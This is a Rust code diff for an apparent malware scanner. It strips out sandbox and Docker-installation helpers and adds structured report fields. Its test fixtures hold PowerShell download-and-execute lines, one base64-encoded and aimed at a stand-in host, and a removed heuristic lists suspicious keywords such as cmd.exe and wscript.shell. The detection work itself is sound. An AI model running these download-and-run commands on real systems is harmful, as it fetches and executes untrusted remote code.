@@ -1,7 +1,6 @@
 use std::collections::VecDeque;
 use std::fs;
 use std::path::{Path, PathBuf};
-use std::process::Command;
 use std::sync::{Arc, Mutex};
 use std::thread;
 use std::time::Instant;
@@ -12,9 +11,10 @@ use super::context::ScanContext;
 use super::file::{cache, discovery};
 use super::heuristics;
 use super::report;
+use super::report::{NormalizedSeverity, ReportReason, SummaryVerdict};
 use super::types::Severity;
 use super::yara;
-use crate::r#static::types::Finding;
+use crate::r#static::types::{Finding, MlAssessment};
 
 #[derive(Debug, Clone, Copy)]
 pub struct ScanProgress {
@@ -25,8 +25,12 @@ pub struct ScanProgress {
 #[derive(Debug, Clone)]
 pub struct ScanOutcome {
     pub severity: Severity,
+    pub normalized_severity: NormalizedSeverity,
+    pub verdict: SummaryVerdict,
     pub summary: String,
     pub findings: Vec<String>,
+    pub finding_details: Vec<Finding>,
+    pub reason_entries: Vec<ReportReason>,
     pub original_path: PathBuf,
     pub quarantine_path: PathBuf,
     pub restored_to_original_path: bool,
@@ -34,6 +38,16 @@ pub struct ScanOutcome {
     pub json_report: String,
     pub cache_hit: bool,
     pub rules_version: String,
+    pub file_name: String,
+    pub extension: String,
+    pub sha256: String,
+    pub sniffed_mime: String,
+    pub detected_format: Option<String>,
+    pub file_size_bytes: u64,
+    pub risk_score: f64,
+    pub safety_score: f64,
+    pub signal_sources: Vec<String>,
+    pub ml_assessment: Option<MlAssessment>,
 }
 
 impl ScanOutcome {
@@ -197,42 +211,6 @@ where
         );
     }
 
-    run_stage(
-        &mut ctx,
-        &mut progress,
-        &mut completed_steps,
-        total_steps,
-        "Preparing sandbox plan",
-        crate::sandbox::plan_for_context,
-    );
-
-    let auto_sandbox = ctx.config.features.enable_auto_sandbox && should_auto_sandbox(&ctx);
-    if auto_sandbox {
-        ctx.log_event(
-            "sandbox",
-            "Automatic sandbox escalation triggered by pre-execution indicators",
-        );
-        ctx.push_finding(Finding::new(
-            "AUTO_SANDBOX_ESCALATION",
-            "ProjectX automatically escalated the sample to sandbox analysis",
-            1.2,
-        ));
-        if let Some(summary) = &mut ctx.threat_severity {
-            summary.auto_sandbox_triggered = true;
-        }
-    }
-
-    if ctx.config.features.enable_dynamic_sandbox || auto_sandbox {
-        run_stage(
-            &mut ctx,
-            &mut progress,
-            &mut completed_steps,
-            total_steps,
-            "Running sandbox detonation",
-            crate::sandbox::execute_for_context,
-        );
-    }
-
     if ctx.config.features.enable_ml_scoring {
         run_stage(
             &mut ctx,
@@ -272,150 +250,6 @@ where
     report::run(&ctx, severity);
 
     Ok((ctx, severity))
-}
-
-fn should_auto_sandbox(ctx: &ScanContext) -> bool {
-    if ctx.dynamic_analysis.is_some() {
-        return false;
-    }
-    if ctx.original_size_bytes > 50 * 1024 * 1024 {
-        return false;
-    }
-
-    let extension = ctx.extension.to_ascii_lowercase();
-    if matches!(
-        extension.as_str(),
-        "asc" | "avi" | "bmp" | "gif" | "jpeg" | "jpg" | "mkv" | "mp4" | "pgp" | "png" | "txt"
-    ) {
-        return false;
-    }
-
-    let high_weight = ctx.findings.iter().map(|finding| finding.weight).sum::<f64>() >= 5.0;
-    let supports_prefilter_submission = matches!(
-        ctx.detected_format.as_deref(),
-        Some("Pe") | Some("Elf") | Some("Pdf") | Some("Zip") | Some("Office")
-    ) || matches!(
-        extension.as_str(),
-        "exe"
-            | "dll"
-            | "com"
-            | "elf"
-            | "pdf"
-            | "rtf"
-            | "doc"
-            | "docx"
-            | "docm"
-            | "dot"
-            | "dotm"
-            | "xls"
-            | "xlsx"
-            | "xlsm"
-            | "ppt"
-            | "pptx"
-            | "pptm"
-            | "pps"
-            | "ppsm"
-            | "potm"
-            | "potx"
-            | "js"
-            | "jse"
-            | "ps1"
-            | "psc1"
-            | "vbs"
-            | "vbe"
-            | "vb"
-            | "wsf"
-            | "wsh"
-            | "wsc"
-            | "sh"
-            | "zip"
-            | "jar"
-            | "7z"
-            | "bz"
-            | "bz2"
-            | "tgz"
-            | "msi"
-            | "rar"
-            | "iso"
-            | "arj"
-            | "eml"
-            | "tnef"
-            | "scr"
-    );
-    let has_unpacking_signals = ctx.findings.iter().any(|finding| {
-        finding.code.contains("PACK")
-            || finding.code.contains("OBFUS")
-            || finding.code.contains("DECODE")
-            || finding.code.contains("SCRIPT")
-            || finding.code.contains("MACRO")
-            || finding.code.contains("PDF_ACTIVE")
-    });
-    let suspicious_strings = ctx
-        .decoded_strings
-        .iter()
-        .any(|value| {
-            let lower = value.to_ascii_lowercase();
-            lower.contains("powershell")
-                || lower.contains("fromcharcode")
-                || lower.contains("http://")
-                || lower.contains("https://")
-                || lower.contains("cmd.exe")
-                || lower.contains("wscript.shell")
-        });
-
-    supports_prefilter_submission && (high_weight || has_unpacking_signals || suspicious_strings)
-}
-
-pub fn ensure_docker() -> Result<(), String> {
-    if is_docker_running() {
-        println!("Docker is already running.");
-        return Ok(());
-    }
-
-    if is_docker_installed() {
-        println!("Docker is installed but not running, starting it...");
-        return start_docker();
-    }
-
-    let auto_install = std::env::var("PROJECTX_AUTO_INSTALL_DOCKER")
-        .ok()
-        .map(|v| v == "1" || v.eq_ignore_ascii_case("true"))
-        .unwrap_or(false);
-
-    if !auto_install {
-        return Err(
-            "Docker not found. Install Docker manually or set PROJECTX_AUTO_INSTALL_DOCKER=1"
-                .to_string(),
-        );
-    }
-
-    println!("Docker not found, installing...");
-    install_docker()
-}
-
-pub fn ensure_ubuntu_image() -> Result<(), String> {
-    println!("Checking for Ubuntu image...");
-    let output = Command::new("docker")
-        .args(["image", "inspect", "ubuntu:22.04"])
-        .output()
-        .map_err(|e| format!("Failed to run docker: {}", e))?;
-
-    if !output.status.success() {
-        println!("Pulling ubuntu:22.04...");
-        let status = Command::new("docker")
-            .args(["pull", "ubuntu:22.04"])
-            .status()
-            .map_err(|e| format!("Failed to pull Ubuntu image: {}", e))?;
-        if !status.success() {
-            return Err(format!(
-                "docker pull ubuntu:22.04 failed with status {}",
-                status
-            ));
-        }
-    } else {
-        println!("Ubuntu image already present.");
-    }
-    Ok(())
 }
 
 pub fn init_quarantine() -> Result<(), String> {
@@ -550,17 +384,37 @@ where
         },
     });
 
+    let signal_sources = scan_signal_sources(&ctx);
+    let reason_entries = ctx
+        .findings
+        .iter()
+        .map(structured_reason_from_finding)
+        .collect::<Vec<_>>();
     Ok(ScanOutcome {
         severity,
+        normalized_severity: report::normalize_severity(severity, ctx.score.risk),
+        verdict: report::verdict_from_severity(severity),
         summary,
         findings,
+        finding_details: ctx.findings.clone(),
+        reason_entries,
         original_path: source.to_path_buf(),
         quarantine_path,
         restored_to_original_path,
         report_path,
         json_report,
         cache_hit: ctx.cache.as_ref().map(|cache| cache.hit).unwrap_or(false),
-        rules_version: ctx.rules_version,
+        rules_version: ctx.rules_version.clone(),
+        file_name: ctx.file_name.clone(),
+        extension: ctx.extension.clone(),
+        sha256: ctx.sha256.clone(),
+        sniffed_mime: ctx.sniffed_mime.clone(),
+        detected_format: ctx.detected_format.clone(),
+        file_size_bytes: target_size_u64(ctx.original_size_bytes),
+        risk_score: ctx.score.risk,
+        safety_score: ctx.score.safety,
+        signal_sources,
+        ml_assessment: ctx.ml_assessment.clone(),
     })
 }
 
@@ -794,8 +648,6 @@ fn pipeline_step_count(config: &ScanConfig) -> usize {
         + usize::from(config.features.enable_format_analysis)
         + usize::from(config.features.enable_yara)
         + usize::from(config.features.enable_emulation)
-        + 1
-        + usize::from(config.features.enable_dynamic_sandbox)
         + usize::from(config.features.enable_ml_scoring)
         + 1
 }
@@ -872,10 +724,21 @@ mod tests {
 
     #[test]
     fn suspicious_files_remain_quarantined() {
-        let path = unique_temp_path("projectx_suspicious_scan");
+        let path = std::env::temp_dir().join(format!(
+            "projectx_suspicious_scan_{}.ps1",
+            SystemTime::now()
+                .duration_since(UNIX_EPOCH)
+                .map(|duration| duration.as_nanos())
+                .unwrap_or(0)
+        ));
         std::fs::write(
             &path,
-            "aWV4IChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwczovL2V2aWwuZXhhbXBsZScp",
+            r#"
+            powershell -EncodedCommand AAAA
+            [Convert]::FromBase64String("QUJDRA==")
+            (New-Object Net.WebClient).DownloadString("https://example.invalid")
+            Invoke-Expression $decoded
+            "#,
         )
         .unwrap();
 
@@ -889,236 +752,31 @@ mod tests {
     }
 }
 
-fn is_docker_running() -> bool {
-    Command::new("docker")
-        .arg("info")
-        .output()
-        .map(|o| o.status.success())
-        .unwrap_or(false)
+fn scan_signal_sources(ctx: &ScanContext) -> Vec<String> {
+    let mut sources = Vec::new();
+    if ctx.cache.as_ref().map(|cache| cache.hit).unwrap_or(false) {
+        sources.push("cache".to_string());
+    }
+    for finding in &ctx.findings {
+        let source = report::normalize_reason_source(&finding.code).to_string();
+        if !sources.contains(&source) {
+            sources.push(source);
+        }
+    }
+    sources
 }
 
-fn is_docker_installed() -> bool {
-    #[cfg(target_os = "macos")]
-    {
-        return Command::new("colima")
-            .arg("--version")
-            .output()
-            .map(|o| o.status.success())
-            .unwrap_or(false);
+fn structured_reason_from_finding(finding: &Finding) -> ReportReason {
+    let source = report::normalize_reason_source(&finding.code);
+    ReportReason {
+        reason_type: source.to_string(),
+        source: source.to_string(),
+        name: report::normalize_reason_name(&finding.code),
+        description: report::normalize_reason_description(&finding.message),
+        weight: finding.weight,
     }
-
-    #[cfg(target_os = "linux")]
-    {
-        return Command::new("docker")
-            .arg("--version")
-            .output()
-            .map(|o| o.status.success())
-            .unwrap_or(false);
-    }
-
-    #[cfg(target_os = "windows")]
-    {
-        return Command::new("wsl")
-            .args(["--list", "--running"])
-            .output()
-            .map(|o| o.status.success())
-            .unwrap_or(false);
-    }
-
-    #[allow(unreachable_code)]
-    false
 }
 
-fn start_docker() -> Result<(), String> {
-    #[cfg(target_os = "macos")]
-    {
-        println!("Starting Colima...");
-        let status = Command::new("colima")
-            .arg("start")
-            .status()
-            .map_err(|e| format!("Failed to start Colima: {}", e))?;
-        if !status.success() {
-            return Err(format!(
-                "Failed to start Colima (exit status: {}). Please check Colima permissions/config.",
-                status
-            ));
-        }
-
-        return wait_for_docker();
-    }
-
-    #[cfg(target_os = "linux")]
-    {
-        println!("Starting Docker service...");
-        let status = Command::new("sudo")
-            .args(["systemctl", "start", "docker"])
-            .status()
-            .map_err(|e| format!("Failed to start Docker service: {}", e))?;
-        if !status.success() {
-            return Err(format!(
-                "Failed to start Docker service (exit status: {}).",
-                status
-            ));
-        }
-
-        return wait_for_docker();
-    }
-
-    #[cfg(target_os = "windows")]
-    {
-        println!("Starting Docker in WSL2...");
-        let status = Command::new("wsl")
-            .args(["-e", "sudo", "service", "docker", "start"])
-            .status()
-            .map_err(|e| format!("Failed to start Docker in WSL2: {}", e))?;
-        if !status.success() {
-            return Err(format!(
-                "Failed to start Docker in WSL2 (exit status: {}).",
-                status
-            ));
-        }
-
-        return wait_for_docker();
-    }
-
-    #[allow(unreachable_code)]
-    Ok(())
-}
-
-fn install_docker() -> Result<(), String> {
-    #[cfg(target_os = "macos")]
-    {
-        if !is_brew_installed() {
-            println!("Installing Homebrew...");
-            let status = Command::new("bash")
-                .args([
-                    "-c",
-                    "/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"",
-                ])
-                .status()
-                .map_err(|e| format!("Failed to install Homebrew: {}", e))?;
-            if !status.success() {
-                return Err(format!(
-                    "Failed to install Homebrew (exit status: {}).",
-                    status
-                ));
-            }
-        }
-
-        println!("Installing Colima and Docker CLI...");
-        let status = Command::new("brew")
-            .args(["install", "colima", "docker"])
-            .status()
-            .map_err(|e| format!("Failed to install Colima and Docker: {}", e))?;
-        if !status.success() {
-            return Err(format!(
-                "Failed to install Colima and Docker (exit status: {}).",
-                status
-            ));
-        }
-
-        return start_docker();
-    }
-
-    #[cfg(target_os = "linux")]
-    {
-        println!("Installing Docker Engine...");
-        let status = Command::new("bash")
-            .args(["-c", "curl -fsSL https://get.docker.com | sh"])
-            .status()
-            .map_err(|e| format!("Failed to install Docker: {}", e))?;
-        if !status.success() {
-            return Err(format!(
-                "Failed to install Docker (exit status: {}).",
-                status
-            ));
-        }
-
-        let user = std::env::var("USER").unwrap_or_default();
-        let status = Command::new("sudo")
-            .args(["usermod", "-aG", "docker", &user])
-            .status()
-            .map_err(|e| format!("Failed to add user to docker group: {}", e))?;
-        if !status.success() {
-            return Err(format!(
-                "Failed to add user to docker group (exit status: {}).",
-                status
-            ));
-        }
-
-        return start_docker();
-    }
-
-    #[cfg(target_os = "windows")]
-    {
-        println!("Enabling WSL2...");
-        let status = Command::new("powershell")
-            .args(["-Command", "wsl --install --no-distribution"])
-            .status()
-            .map_err(|e| format!("Failed to enable WSL2: {}", e))?;
-        if !status.success() {
-            return Err(format!("Failed to enable WSL2 (exit status: {}).", status));
-        }
-
-        println!("Installing Ubuntu in WSL2...");
-        let status = Command::new("powershell")
-            .args(["-Command", "wsl --install -d Ubuntu"])
-            .status()
-            .map_err(|e| format!("Failed to install Ubuntu in WSL2: {}", e))?;
-        if !status.success() {
-            return Err(format!(
-                "Failed to install Ubuntu in WSL2 (exit status: {}).",
-                status
-            ));
-        }
-
-        println!("Installing Docker Engine inside WSL2...");
-        let status = Command::new("wsl")
-            .args(["-e", "bash", "-c", "curl -fsSL https://get.docker.com | sh"])
-            .status()
-            .map_err(|e| format!("Failed to install Docker in WSL2: {}", e))?;
-        if !status.success() {
-            return Err(format!(
-                "Failed to install Docker in WSL2 (exit status: {}).",
-                status
-            ));
-        }
-
-        let status = Command::new("wsl")
-            .args(["-e", "bash", "-c", "sudo usermod -aG docker $USER"])
-            .status()
-            .map_err(|e| format!("Failed to add user to docker group in WSL2: {}", e))?;
-        if !status.success() {
-            return Err(format!(
-                "Failed to add user to docker group in WSL2 (exit status: {}).",
-                status
-            ));
-        }
-
-        return start_docker();
-    }
-
-    #[allow(unreachable_code)]
-    Ok(())
-}
-
-fn wait_for_docker() -> Result<(), String> {
-    println!("Waiting for Docker to be ready...");
-    for _ in 0..30 {
-        std::thread::sleep(std::time::Duration::from_secs(2));
-        if is_docker_running() {
-            println!("Docker is ready.");
-            return Ok(());
-        }
-    }
-    Err("Docker took too long to start, please try again.".to_string())
-}
-
-#[cfg(target_os = "macos")]
-fn is_brew_installed() -> bool {
-    Command::new("brew")
-        .arg("--version")
-        .output()
-        .map(|o| o.status.success())
-        .unwrap_or(false)
+fn target_size_u64(size: usize) -> u64 {
+    size.min(u64::MAX as usize) as u64
 }
